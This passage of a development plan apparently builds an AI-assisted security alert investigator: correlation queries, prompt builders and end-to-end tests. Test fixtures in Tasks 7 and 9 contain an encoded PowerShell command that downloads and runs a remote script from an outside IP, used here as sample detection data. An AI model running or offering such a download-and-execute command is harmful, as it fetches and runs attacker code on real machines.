git add app/agent/schemas.py tests/test_agent_schemas.py
git commit -m "feat: add process-execution response actions to RecommendedAction catalog"
```

---

### Task 6: Correlate — `SAME_COMMAND_LINE_ENV_WIDE` canonical template

**Files:**
- Modify: `app/agent/schemas.py`
- Modify: `app/agent/correlation_queries.py`
- Modify: `app/agent/prompts.py`
- Test: `tests/test_correlation_queries.py`
- Test: `tests/test_state_graph.py`

**Interfaces:**
- Produces: `SearchTemplate.SAME_COMMAND_LINE_ENV_WIDE`. `build_canonical_queries(alert)` returns this key too (query when `alert.process.command_line` is set, else `None`) — no change to `_run_canonical_searches`/`_step_correlate`, which already iterate the dict generically.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_correlation_queries.py`, right after `test_same_dst_host_query_is_none_when_destination_ip_absent` (end of file):

```python
from app.schemas import ProcessExecutionFields


def test_builds_same_command_line_query_when_process_command_line_present():
    alert = _make_alert(process=ProcessExecutionFields(command_line="powershell.exe -enc AAA"))

    queries = build_canonical_queries(alert)

    query = queries[SearchTemplate.SAME_COMMAND_LINE_ENV_WIDE]
    assert query is not None
    assert query.clauses[0].field == "data.win.eventdata.commandLine"
    assert query.clauses[0].operator == "eq"
    assert query.clauses[0].value == "powershell.exe -enc AAA"


def test_same_command_line_query_is_none_when_process_absent():
    alert = _make_alert()

    queries = build_canonical_queries(alert)

    assert queries[SearchTemplate.SAME_COMMAND_LINE_ENV_WIDE] is None
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_correlation_queries.py -v`
Expected: FAIL with `AttributeError: SAME_COMMAND_LINE_ENV_WIDE` (enum member doesn't exist yet).

- [ ] **Step 3: Add the enum member**

In `app/agent/schemas.py`, add to `SearchTemplate` (currently lines 25-29), before `NONE_NEEDED`:

```python
class SearchTemplate(str, Enum):
    SAME_SRC_IP_24H = "same_src_ip_24h"
    SAME_RULE_ID_HOST = "same_rule_id_host"
    SAME_DST_HOST = "same_dst_host"
    SAME_COMMAND_LINE_ENV_WIDE = "same_command_line_env_wide"
    NONE_NEEDED = "none_needed"
```

- [ ] **Step 4: Add the query to `build_canonical_queries`**

In `app/agent/correlation_queries.py`, add right before `return queries` (line 38):

```python
    if alert.process and alert.process.command_line:
        queries[SearchTemplate.SAME_COMMAND_LINE_ENV_WIDE] = SearchQuery(
            clauses=[SearchClause(
                field="data.win.eventdata.commandLine", operator="eq", value=alert.process.command_line
            )],
            time_range=window,
        )
    else:
        queries[SearchTemplate.SAME_COMMAND_LINE_ENV_WIDE] = None
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `pytest tests/test_correlation_queries.py -v`
Expected: all PASS. Existing tests (e.g. `test_run_canonical_searches_sums_evidence_count_across_all_three` in `tests/test_state_graph.py`) still pass unchanged: their `_make_alert()` fixtures never set `process`, so the new template resolves to `None` and is skipped exactly like `SAME_SRC_IP_24H`/`SAME_DST_HOST` already are for IP-less alerts.

- [ ] **Step 6: Update the correlation-decision prompt's menu text**

In `app/agent/prompts.py`, `build_correlation_decision_prompt` (line 30), change:

```python
        "and pick at most one follow_up_query from the closed menu "
        "(same_src_ip_24h, same_rule_id_host, same_dst_host, or none_needed) if further investigation "
```

to:

```python
        "and pick at most one follow_up_query from the closed menu "
        "(same_src_ip_24h, same_rule_id_host, same_dst_host, same_command_line_env_wide, or none_needed) "
        "if further investigation "
```

- [ ] **Step 7: Write the failing prompt test**

Add to `tests/test_state_graph.py`, right after `test_step_correlate_skips_open_value_search_when_proposal_call_fails` (around line 550):

```python
def test_correlation_decision_prompt_includes_command_line_template():
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            CorrelationDecision: CorrelationDecision(pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED)
        },
    )
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    analyst._classify_correlation(alert, {}, 0)

    prompt = llm_client.calls[0][0]
    assert "same_command_line_env_wide" in prompt
```

- [ ] **Step 8: Run tests to verify they pass**

Run: `pytest tests/test_state_graph.py -k correlation_decision_prompt_includes_command_line -v`
Expected: PASS.

- [ ] **Step 9: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS.

- [ ] **Step 10: Commit**

```bash
git add app/agent/schemas.py app/agent/correlation_queries.py app/agent/prompts.py tests/test_correlation_queries.py tests/test_state_graph.py
git commit -m "feat: add environment-wide same-command-line canonical correlation search"
```

---

### Task 7: Prompt builders gain `command_context`

**Files:**
- Modify: `app/agent/prompts.py`
- Test: `tests/test_prompts.py` (new)

**Interfaces:**
- Consumes: `CommandDecodeResult` from `app.schemas` (Task 1).
- Produces: `build_risk_assessment_prompt(..., command_context=None)`, `_findings_block(..., command_context=None)`, `build_draft_canonical_prompt(..., command_context=None)`, `build_draft_experimental_prompt(..., command_context=None)`, `build_self_check_prompt(..., command_context=None)` — all backward compatible (trailing optional param).

- [ ] **Step 1: Write the failing tests**

Create `tests/test_prompts.py`:

```python
from datetime import datetime, timezone
from uuid import uuid4

from app.agent.prompts import (
    build_draft_canonical_prompt,
    build_draft_experimental_prompt,
    build_risk_assessment_prompt,
    build_self_check_prompt,
)
from app.agent.schemas import DraftReportCanonical, PatternType, RecommendedAction
from app.schemas import AgentRef, Alert, CommandDecodeResult, Confidence, DecodedSegment, RiskAssessment, Severity


def _make_alert(**overrides):
    defaults = dict(
        alert_id=uuid4(),
        source_alert_id="1700000000.987654",
        source_system="wazuh",
        rule_id="92009",
        rule_description="Sysmon - process creation",
        rule_level=12,
        timestamp=datetime.now(timezone.utc),
        ingested_at=datetime.now(timezone.utc),
        agent=AgentRef(id="003", name="WIN-DESKTOP01", ip="172.20.10.5"),
        manager_name="wazuh-manager",
        location="EventChannel",
        full_log="",
        raw_json={"rule": {"id": "92009"}},
    )
    defaults.update(overrides)
    return Alert(**defaults)


_COMMAND_CONTEXT = CommandDecodeResult(
    command_line="powershell.exe -EncodedCommand SQBFAFgA...",
    parent_command_line="C:\\Windows\\explorer.exe",
    decoded_segments=[
        DecodedSegment(
            encoding="powershell_encoded",
            original="SQBFAFgA...",
            decoded="IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.1/a.ps1')",
        )
    ],
)


def test_risk_assessment_prompt_includes_command_context_when_present():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], command_context=_COMMAND_CONTEXT)

    assert "powershell.exe -EncodedCommand" in prompt
    assert "185.220.101.1" in prompt


def test_risk_assessment_prompt_omits_command_context_when_absent():
    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [])

    assert "Command line:" not in prompt


def test_draft_canonical_prompt_includes_command_context():
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_draft_canonical_prompt(
        _make_alert(), PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_draft_experimental_prompt_includes_command_context():
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_draft_experimental_prompt(
        _make_alert(), PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_self_check_prompt_includes_command_context():
    draft = DraftReportCanonical(alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION])
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    prompt = build_self_check_prompt(
        draft, PatternType.OTHER, 0, [], risk_assessment, command_context=_COMMAND_CONTEXT
    )

    assert "185.220.101.1" in prompt


def test_command_context_fields_are_truncated_in_prompt():
    long_command = "a" * 1000
    long_context = CommandDecodeResult(command_line=long_command, decoded_segments=[])

    prompt = build_risk_assessment_prompt(_make_alert(), PatternType.OTHER, 0, [], command_context=long_context)

    assert "a" * 501 not in prompt
    assert "...(truncated)" in prompt
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_prompts.py -v`
Expected: FAIL with `TypeError: build_risk_assessment_prompt() got an unexpected keyword argument 'command_context'` (and similarly for the other builders).

- [ ] **Step 3: Add the shared helper and thread `command_context` through every builder**

In `app/agent/prompts.py`, add near the top (after the existing imports, before `build_extract_indicators_prompt`):

```python
_COMMAND_CONTEXT_CHAR_CAP = 500


def _truncate(text) -> str:
    if not text:
        return "none"
    return text if len(text) <= _COMMAND_CONTEXT_CHAR_CAP else text[:_COMMAND_CONTEXT_CHAR_CAP] + "...(truncated)"


def _command_context_block(command_context) -> str:
    if command_context is None:
        return ""
    decoded_summary = "\n".join(
        f"  - [{s.encoding}] {_truncate(s.decoded)}" for s in command_context.decoded_segments
    ) or "  none"
    return (
        f"Command line: {_truncate(command_context.command_line)}\n"
        f"Parent command line: {_truncate(command_context.parent_command_line)}\n"
        f"Decoded command segments:\n{decoded_summary}\n\n"
    )
```

Update `build_risk_assessment_prompt` (currently lines 35-52) — add the parameter and insert the block before the final instruction line:

```python
def build_risk_assessment_prompt(alert, pattern_type, evidence_count, enrichment_results, command_context=None) -> str:
    enrichment_summary = "\n".join(
        f"- {e.indicator_type.value} {e.indicator_value}: {e.verdict.value} (provider {e.provider_id})"
        for e in enrichment_results
    ) or "none"
    mitre_summary = (
        ", ".join(f"{m.technique_id} ({m.technique_name})" for m in alert.mitre) if alert.mitre else "none mapped"
    )
    return (
        "You are assessing the risk of a security alert for a human analyst to review.\n\n"
        f"Rule: {alert.rule_id} - {alert.rule_description} (level {alert.rule_level}, "
        f"groups: {', '.join(alert.rule_groups)}).\n"
        f"Known MITRE ATT&CK mapping: {mitre_summary}.\n"
        f"Correlation findings: pattern_type={pattern_type.value}, evidence_count={evidence_count}.\n"
        f"Enrichment findings:\n{enrichment_summary}\n\n"
        f"{_command_context_block(command_context)}"
        "Assess the severity (low/medium/high/critical), your confidence in this assessment "
        "(low/medium/high), and a one-to-two-sentence rationale."
    )
```

Update `_findings_block` (currently lines 70-82):

```python
def _findings_block(alert, pattern_type, evidence_count, enrichment_results, risk_assessment, command_context=None) -> str:
    enrichment_summary = "\n".join(
        f"- {e.indicator_type.value} {e.indicator_value}: {e.verdict.value} (provider {e.provider_id})"
        for e in enrichment_results
    ) or "none"
    return (
        f"Rule: {alert.rule_id} - {alert.rule_description} (level {alert.rule_level}, "
        f"groups: {', '.join(alert.rule_groups)}).\n"
        f"Correlation findings: pattern_type={pattern_type.value}, evidence_count={evidence_count}.\n"
        f"Enrichment findings:\n{enrichment_summary}\n"
        f"Risk assessment: severity={risk_assessment.severity.value}, confidence={risk_assessment.confidence.value}, "
        f"rationale: {risk_assessment.rationale}\n"
        f"{_command_context_block(command_context)}"
    )
```

Update `build_draft_canonical_prompt` (currently lines 85-94) — add the parameter and pass it to `_findings_block`:

```python
def build_draft_canonical_prompt(alert, pattern_type, evidence_count, enrichment_results, risk_assessment, command_context=None) -> str:
    action_menu = "\n".join(f"- {a.value}" for a in RecommendedAction)
    return (
        "You are drafting the canonical, vetted section of a security investigation report for a human analyst.\n\n"
        f"{_findings_block(alert, pattern_type, evidence_count, enrichment_results, risk_assessment, command_context)}\n"
        "Write a plain-language alert_summary (1-2 sentences), an expanded rationale (2-4 sentences) explaining "
        "the risk assessment above in more detail, and select every recommended_action below that applies to "
        "this alert — you MUST only pick from this exact list:\n"
        f"{action_menu}"
    )
```

Update `build_draft_experimental_prompt` (currently lines 97-105) the same way:

```python
def build_draft_experimental_prompt(alert, pattern_type, evidence_count, enrichment_results, risk_assessment, command_context=None) -> str:
    return (
        "You are drafting an EXPERIMENTAL, not-yet-vetted section of a security investigation report. "
        "This output will be clearly labeled experimental and will not be treated as trusted guidance.\n\n"
        f"{_findings_block(alert, pattern_type, evidence_count, enrichment_results, risk_assessment, command_context)}\n"
        "Freely propose any additional recommended actions in your own words (no fixed list this time), then "
        "classify whether this alert looks like a true_positive, false_positive, or uncertain, with a "
        "one-sentence rationale for that triage call."
    )
```

Update `build_self_check_prompt` (currently lines 108-124):

```python
def build_self_check_prompt(draft, pattern_type, evidence_count, enrichment_results, risk_assessment, command_context=None) -> str:
    claims = [draft.alert_summary, draft.rationale, *[a.value for a in draft.recommended_actions]]
    claims_block = "\n".join(f"{i + 1}. {claim}" for i, claim in enumerate(claims))
    enrichment_summary = "\n".join(
        f"- {e.indicator_type.value} {e.indicator_value}: {e.verdict.value} (provider {e.provider_id})"
        for e in enrichment_results
    ) or "none"
    return (
        "You are auditing a draft security report against the structured findings that produced it. "
        "For EACH numbered claim below, decide whether the structured findings support it. If not, and you "
        "can propose a better-supported replacement, provide a correction; otherwise leave correction empty.\n\n"
        f"Correlation findings: pattern_type={pattern_type.value}, evidence_count={evidence_count}.\n"
        f"Enrichment findings:\n{enrichment_summary}\n"
        f"Risk assessment: severity={risk_assessment.severity.value}, confidence={risk_assessment.confidence.value}.\n\n"
        f"{_command_context_block(command_context)}"
        f"Claims to audit, in order:\n{claims_block}\n\n"
        "Return exactly one audit per claim, in the same order."
    )
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `pytest tests/test_prompts.py -v`
Expected: all PASS.

- [ ] **Step 5: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS — every existing caller of these five functions omits `command_context`, so it defaults to `None` and `_command_context_block` returns `""`, leaving prompt text byte-for-byte identical to before for every alert without `alert.process` set.

- [ ] **Step 6: Commit**

```bash
git add app/agent/prompts.py tests/test_prompts.py
git commit -m "feat: thread bounded command context into risk/draft/self-check prompts"
```

---

### Task 8: Wire `command_context` through the state graph + `Report.command_analysis`

**Files:**
- Modify: `app/agent/state_graph.py`
- Test: `tests/test_state_graph.py`

**Interfaces:**
- Consumes: prompt builders from Task 7; `command_decode_result` from Task 4's `_step_extract_indicators`.
- Produces: `_step_risk_assessment(..., command_context=None)`, `_step_draft_report(..., command_context=None)`, `_step_self_check(..., command_context=None)`, `_assemble_report(..., command_analysis=None)` — all backward-compatible trailing optional params. `investigate()` threads `command_decode_result` through all three and into the final `Report`.

- [ ] **Step 1: Write the failing tests**

Add to `tests/test_state_graph.py`, right after `test_step_risk_assessment_logs_prompt_and_result` (around line 645):

```python
def test_step_risk_assessment_passes_command_context_to_prompt():
    from app.schemas import CommandDecodeResult, DecodedSegment

    command_context = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
    )
    llm_client = _FakeLLMClient(responses={
        RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()

    analyst._step_risk_assessment(alert, PatternType.OTHER, 0, [], model_available=True, command_context=command_context)

    assert "185.220.101.1" in llm_client.calls[0][0]
```

Add right after `test_draft_canonical_prompt_contains_pattern_type_and_evidence_count` (around line 725):

```python
def test_step_draft_report_passes_command_context_to_prompts():
    from app.schemas import CommandDecodeResult, DecodedSegment

    command_context = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
    )
    llm_client = _FakeLLMClient(responses={
        DraftReportCanonical: DraftReportCanonical(
            alert_summary="x", rationale="y", recommended_actions=[RecommendedAction.MONITOR_NO_ACTION]
        ),
        DraftReportExperimental: DraftReportExperimental(
            recommended_actions_freeform=[], triage_verdict=TriageVerdict.UNCERTAIN, triage_rationale="z"
        ),
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    analyst._step_draft_report(
        alert, PatternType.OTHER, 0, [], risk_assessment, model_available=True, command_context=command_context
    )

    canonical_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportCanonical)
    experimental_prompt = next(p for p, schema in llm_client.calls if schema is DraftReportExperimental)
    assert "185.220.101.1" in canonical_prompt
    assert "185.220.101.1" in experimental_prompt
```

Add right after `test_self_check_prompt_contains_draft_alert_summary` (around line 1041):

```python
def test_step_self_check_passes_command_context_to_prompt():
    from app.schemas import CommandDecodeResult, DecodedSegment

    command_context = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami http://185.220.101.1")],
    )
    draft = _draft_with_two_actions()
    llm_client = _FakeLLMClient(responses={
        SelfCheckResult: SelfCheckResult(audits=[
            ClaimAudit(claim=draft.alert_summary, supported=True),
            ClaimAudit(claim=draft.rationale, supported=True),
            ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
            ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
        ])
    })
    analyst = _make_analyst(llm_client=llm_client)
    alert = _make_alert()
    risk_assessment = RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x")

    analyst._step_self_check(
        alert, draft, PatternType.BRUTE_FORCE, 14, [], risk_assessment,
        _passthrough_correlate_step(), model_available=True, command_context=command_context,
    )

    self_check_prompt = next(p for p, schema in llm_client.calls if schema is SelfCheckResult)
    assert "185.220.101.1" in self_check_prompt
```

Add right after `test_assemble_report_includes_experimental_fields_when_present` (end of that test group, around line 1349):

```python
def test_assemble_report_includes_command_analysis_when_present():
    from app.schemas import CommandDecodeResult, DecodedSegment

    analyst = _make_analyst()
    alert = _make_alert()
    draft = _draft_with_two_actions()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")
    command_analysis = CommandDecodeResult(
        command_line="powershell.exe -EncodedCommand AAA",
        decoded_segments=[DecodedSegment(encoding="powershell_encoded", original="AAA", decoded="whoami")],
    )

    report = analyst._assemble_report(
        alert, [], [], risk_assessment, draft, None, "", model_available=True, command_analysis=command_analysis,
    )

    assert report.command_analysis.decoded_segments[0].decoded == "whoami"


def test_assemble_report_command_analysis_defaults_to_none():
    analyst = _make_analyst()
    alert = _make_alert()
    draft = _draft_with_two_actions()
    risk_assessment = RiskAssessment(severity=Severity.LOW, confidence=Confidence.LOW, rationale="x")

    report = analyst._assemble_report(alert, [], [], risk_assessment, draft, None, "", model_available=True)

    assert report.command_analysis is None
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_state_graph.py -k "command_context or command_analysis" -v`
Expected: FAIL with `TypeError: ... got an unexpected keyword argument 'command_context'` (or `'command_analysis'`).

- [ ] **Step 3: Thread `command_context` through Risk Assessment**

In `app/agent/state_graph.py`, update `_assess_risk` (currently lines 486-502):

```python
    def _assess_risk(
        self, alert: Alert, pattern_type: PatternType, evidence_count: int,
        enrichment_results: list[EnrichmentResult], command_context: CommandDecodeResult | None = None,
    ) -> RiskAssessment:
        prompt = build_risk_assessment_prompt(alert, pattern_type, evidence_count, enrichment_results, command_context)
        logger.debug("_assess_risk prompt: %s", prompt)
        try:
            assessment = self._llm_client.generate_structured(prompt, RiskAssessment)
        except LLMClientError as exc:
            self._degraded_reasons.append(f"risk assessment failed: {exc.kind}")
            logger.debug("_assess_risk failed: %s", exc.kind)
            return RiskAssessment(
                severity=Severity.LOW, confidence=Confidence.LOW,
                rationale=f"risk assessment failed: {exc.kind}",
            )
        logger.debug("_assess_risk result: %s", assessment.model_dump_json())
        return assessment
```

Update `_step_risk_assessment`'s signature (currently lines 457-460) and its call to `_assess_risk` (line 477):

```python
    def _step_risk_assessment(
        self, alert: Alert, pattern_type: PatternType, evidence_count: int,
        enrichment_results: list[EnrichmentResult], model_available: bool,
        command_context: CommandDecodeResult | None = None,
    ) -> tuple[RiskAssessment, InvestigationStep]:
```

(body unchanged except the `_assess_risk` call becomes `self._assess_risk(alert, pattern_type, evidence_count, enrichment_results, command_context)`.)

- [ ] **Step 4: Thread `command_context` through Draft Report**

Update `_draft_canonical` (currently lines 548-565) and `_draft_experimental` (567-579) — add `command_context: CommandDecodeResult | None = None` as the last parameter to each, and pass it as the last positional argument to `build_draft_canonical_prompt`/`build_draft_experimental_prompt` respectively.

Update `_step_draft_report`'s signature (currently lines 504-507) to add the same trailing parameter, and pass `command_context` through to both its `self._draft_canonical(...)` and `self._draft_experimental(...)` calls (lines 529 and 532).

- [ ] **Step 5: Thread `command_context` through Self-Check**

Update `_run_self_check` (currently lines 639-652) — add `command_context: CommandDecodeResult | None = None` as the last parameter, pass it to `build_self_check_prompt`.

Update `_step_self_check`'s signature (currently lines 581-585) to add the same trailing parameter, and pass it through to its `self._run_self_check(...)` call (line 597).

- [ ] **Step 6: Add `command_analysis` to `_assemble_report`**

Update `_assemble_report`'s signature (currently lines 654-658) to add `command_analysis: CommandDecodeResult | None = None` as the last parameter, and add `command_analysis=command_analysis,` as the last keyword argument to the `Report(...)` constructor (after `model_metadata=...`, around line 682).

- [ ] **Step 7: Wire it all together in `investigate()`**

Replace the calls to `_step_risk_assessment`, `_step_draft_report`, `_step_self_check`, and `_assemble_report` inside `investigate()` (currently lines 733-751):

```python
        risk_assessment, risk_step = self._step_risk_assessment(
            alert, pattern_type, evidence_count, enrichment_results, model_available,
            command_context=command_decode_result,
        )
        timeline.append(risk_step)

        draft, experimental, draft_step = self._step_draft_report(
            alert, pattern_type, evidence_count, enrichment_results, risk_assessment, model_available,
            command_context=command_decode_result,
        )
        timeline.append(draft_step)

        draft, uncertainty_notes, self_check_step = self._step_self_check(
            alert, draft, pattern_type, evidence_count, enrichment_results, risk_assessment,
            correlate_step, model_available, command_context=command_decode_result,
        )
        timeline.append(self_check_step)

        report = self._assemble_report(
            alert, timeline, enrichment_results, risk_assessment, draft, experimental, uncertainty_notes,
            model_available, command_analysis=command_decode_result,
        )
```

- [ ] **Step 8: Run tests to verify they pass**

Run: `pytest tests/test_state_graph.py -k "command_context or command_analysis" -v`
Expected: all PASS.

- [ ] **Step 9: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS — every existing test calling these four functions omits the new trailing parameter, so it defaults to `None` and behaves exactly as before.

- [ ] **Step 10: Commit**

```bash
git add app/agent/state_graph.py tests/test_state_graph.py
git commit -m "feat: wire command context through risk/draft/self-check steps and Report.command_analysis"
```

---

### Task 9: Full end-to-end pipeline test

**Files:**
- Test: `tests/test_state_graph.py`

**Interfaces:**
- Consumes: everything from Tasks 1-8. No production code changes — this task is purely a verification gate proving the whole feature works together through `AgenticAnalyst.investigate()`.

- [ ] **Step 1: Write the failing end-to-end test**

Add to `tests/test_state_graph.py`, right after `test_investigate_runs_full_pipeline_and_persists_report` (after line 1113):

```python
def test_investigate_decodes_command_line_and_enriches_embedded_ioc(tmp_path):
    from app.schemas import ProcessExecutionFields

    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    ps_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQAvAGEALgBwAHMAMQAnACkA"
    alert = _make_alert(
        rule_id="92009",
        rule_description="Sysmon - process creation via encoded PowerShell command",
        full_log="",
        process=ProcessExecutionFields(command_line=f"powershell.exe -EncodedCommand {ps_b64}"),
    )
    alert_store.save_raw_alert(alert)

    registry = EnrichmentRegistry()
    registry.register(_FakeIPProvider(result=_make_enrichment_result(
        indicator_value="185.220.101.1", verdict=EnrichmentVerdict.MALICIOUS,
    )))
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(id="003", name="WIN-DESKTOP01", ip="172.20.10.5", status="active"),
        rule_metadata=RuleMetadata(rule_id="92009", description="x", level=12),
    )
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            ExtractedIndicators: ExtractedIndicators(candidates=[]),
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.OTHER, follow_up_query=SearchTemplate.NONE_NEEDED
            ),
            OpenValueSearchProposal: OpenValueSearchProposal(search_value="185.220.101.1"),
            RiskAssessment: RiskAssessment(
                severity=Severity.HIGH, confidence=Confidence.HIGH,
                rationale="Encoded PowerShell command downloads a script from a known-malicious IP.",
            ),
            DraftReportCanonical: DraftReportCanonical(
                alert_summary="Encoded PowerShell process creation contacting a malicious IP.",
                rationale="The decoded command line downloads and executes a remote script.",
                recommended_actions=[RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS, RecommendedAction.ISOLATE_HOST],
            ),
            DraftReportExperimental: DraftReportExperimental(
                recommended_actions_freeform=["Block the IP at the perimeter"],
                triage_verdict=TriageVerdict.TRUE_POSITIVE,
                triage_rationale="Encoded download-and-execute pattern against a malicious IP.",
            ),
            SelfCheckResult: SelfCheckResult(audits=[
                ClaimAudit(claim="Encoded PowerShell process creation contacting a malicious IP.", supported=True),
                ClaimAudit(claim="The decoded command line downloads and executes a remote script.", supported=True),
                ClaimAudit(claim=RecommendedAction.TERMINATE_SUSPICIOUS_PROCESS.value, supported=True),
                ClaimAudit(claim=RecommendedAction.ISOLATE_HOST.value, supported=True),
            ]),
        },
    )
    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)

    report = analyst.investigate(alert)

    assert report.command_analysis is not None
    assert len(report.command_analysis.decoded_segments) == 1
    assert "185.220.101.1" in report.command_analysis.decoded_segments[0].decoded
    assert any(f.indicator_value == "185.220.101.1" for f in report.enrichment_findings)
    assert any(f.verdict == EnrichmentVerdict.MALICIOUS for f in report.enrichment_findings)
    assert report.status == ReportStatus.COMPLETE

    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
    assert "185.220.101.1" in risk_prompt


def test_investigate_non_process_alert_is_fully_unaffected(tmp_path):
    """Regression: an alert with no process fields behaves identically to before this feature."""
    engine = get_engine(str(tmp_path / "test.db"))
    init_db(engine)
    alert_store = SQLiteAlertStore(engine)
    alert = _make_alert(full_log="Invalid user admin from 203.0.113.5", source_ip="203.0.113.5")
    alert_store.save_raw_alert(alert)

    registry = EnrichmentRegistry()
    registry.register(_FakeIPProvider(result=_make_enrichment_result()))
    siem = _FakeSIEMConnector(
        agent_context=AgentContext(id="001", name="web-01", ip="10.0.0.5", status="active"),
        rule_metadata=RuleMetadata(rule_id="5710", description="x", level=5),
        search_results={"data.srcip": SearchResult(alerts=[], total_count=1), "rule.id": SearchResult(alerts=[], total_count=1)},
    )
    llm_client = _FakeLLMClient(
        model_available=True,
        responses={
            ExtractedIndicators: ExtractedIndicators(candidates=[]),
            CorrelationDecision: CorrelationDecision(
                pattern_type=PatternType.BRUTE_FORCE, follow_up_query=SearchTemplate.NONE_NEEDED
            ),
            RiskAssessment: RiskAssessment(severity=Severity.HIGH, confidence=Confidence.HIGH, rationale="x"),
            DraftReportCanonical: DraftReportCanonical(
                alert_summary="Brute-force login attempts detected from 203.0.113.5 against web-01.",
                rationale="High confidence based on repeated failed logins and a known-malicious source IP.",
                recommended_actions=[RecommendedAction.BLOCK_SOURCE_IP, RecommendedAction.DISABLE_OR_RESET_ACCOUNT],
            ),
            DraftReportExperimental: DraftReportExperimental(
                recommended_actions_freeform=["Consider geo-blocking the source region"],
                triage_verdict=TriageVerdict.TRUE_POSITIVE,
                triage_rationale="Pattern matches a known brute-force signature.",
            ),
            SelfCheckResult: SelfCheckResult(audits=[
                ClaimAudit(claim="Brute-force login attempts detected from 203.0.113.5 against web-01.", supported=True),
                ClaimAudit(claim="High confidence based on repeated failed logins and a known-malicious source IP.", supported=True),
                ClaimAudit(claim=RecommendedAction.BLOCK_SOURCE_IP.value, supported=True),
                ClaimAudit(claim=RecommendedAction.DISABLE_OR_RESET_ACCOUNT.value, supported=True),
            ]),
        },
    )
    analyst = AgenticAnalyst(siem=siem, alert_store=alert_store, enrichment_registry=registry, llm_client=llm_client)

    report = analyst.investigate(alert)

    assert report.command_analysis is None
    assert report.status == ReportStatus.COMPLETE
    risk_prompt = next(p for p, schema in llm_client.calls if schema is RiskAssessment)
    assert "Command line:" not in risk_prompt
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `pytest tests/test_state_graph.py -k "decodes_command_line_and_enriches or non_process_alert_is_fully_unaffected" -v`
Expected: if any Task 1-8 step was missed, this fails now (e.g. `AttributeError` on `report.command_analysis`, or the embedded IP not found). If Tasks 1-8 were completed correctly, both tests should already PASS on first run — this task adds no new production code, only the verification.

- [ ] **Step 3: Run the full test suite**

Run: `pytest tests/ -v`
Expected: all PASS.

- [ ] **Step 4: Commit**

```bash
git add tests/test_state_graph.py
git commit -m "test: add end-to-end coverage for command-line execution alert investigation"
```

---

## Post-Implementation Note

This plan deliberately does not touch `CLAUDE.md`. Per the project's own convention (see `ROADMAP.md`'s phase write-ups), update `CLAUDE.md`'s §4.1 state-graph description and §2.1 `Alert` field table after this plan is fully executed, summarizing what was actually built — not as part of this plan's tasks.
